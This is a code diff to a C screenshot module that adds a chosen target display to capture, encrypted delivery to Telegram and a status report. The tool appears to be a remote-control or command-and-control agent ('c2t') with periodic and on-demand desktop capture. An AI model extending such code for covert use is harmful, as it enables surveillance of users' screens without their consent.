@@ -146,14 +146,21 @@ static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
 
 #include "../crypto/crypto.h"
 
-int screenshot_capture_and_send(const char *caption) {
+int screenshot_capture_display_and_send(const char *display_target, const char *caption) {
   void *image_data = nullptr;
   size_t image_size = 0;
   const char *mime_type = "image/bmp";
   const char *filename = "screenshot.bmp";
 
-  if (!screenshot_capture(&image_data, &image_size, &mime_type, &filename)) {
-    c2t_log_warning("screenshot", "Screenshot capture failed");
+  char target[64] = "all";
+  if (display_target && *display_target) {
+    snprintf(target, sizeof(target), "%s", display_target);
+  } else {
+    screenshot_get_selected_display(target, sizeof(target));
+  }
+
+  if (!screenshot_capture_display(target, &image_data, &image_size, &mime_type, &filename)) {
+    c2t_log_warning("screenshot", "Screenshot capture failed for target '%s'", target);
     return 0;
   }
 
@@ -172,7 +179,7 @@ int screenshot_capture_and_send(const char *caption) {
     char time_str[64];
     strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", &tm_buf);
     snprintf(source.title, sizeof(source.title),
-             "🖥️ Desktop Screenshot [%s]", time_str);
+             "🖥️ Desktop Screenshot [%s] (Display %s)", time_str, target);
   }
 
   unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
@@ -241,6 +248,12 @@ int screenshot_capture_and_send(const char *caption) {
     c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram after %zu attempts", attempts);
     return 0;
   }
+}
+
+int screenshot_capture_and_send(const char *caption) {
+  char cur_target[64] = "all";
+  screenshot_get_selected_display(cur_target, sizeof(cur_target));
+  return screenshot_capture_display_and_send(cur_target, caption);
 }
 
 #ifdef _WIN32
@@ -411,15 +424,21 @@ void screenshot_get_status_info(char *buffer, size_t max_len) {
   char b_str[64] = {};
   format_metric_bytes(b, b_str, sizeof(b_str));
 
+  char target_disp[64] = "all";
+  screenshot_get_selected_display(target_disp, sizeof(target_disp));
+
   snprintf(buffer, max_len,
            "📸 <b>Screenshot Subsystem Status</b>\n\n"
            "• <b>Backend:</b> <code>%s</code>\n"
            "• <b>Status:</b> %s\n"
+           "• <b>Target Display:</b> <code>%s</code> (%d displays detected)\n"
            "• <b>Periodic Timer:</b> %s (%zu s)\n"
            "• <b>Total Screenshots Captured:</b> %llu\n"
            "• <b>Total Transferred:</b> %s",
            screenshot_get_backend_name(),
            paused ? "⏸️ <b>PAUSED</b>" : "🟢 <b>ACTIVE</b>",
+           target_disp,
+           screenshot_get_display_count(),
            screenshot_interval_seconds > 0 ? "Enabled" : "On-demand only (/screenshot)",
            screenshot_interval_seconds,
            (unsigned long long)caps,
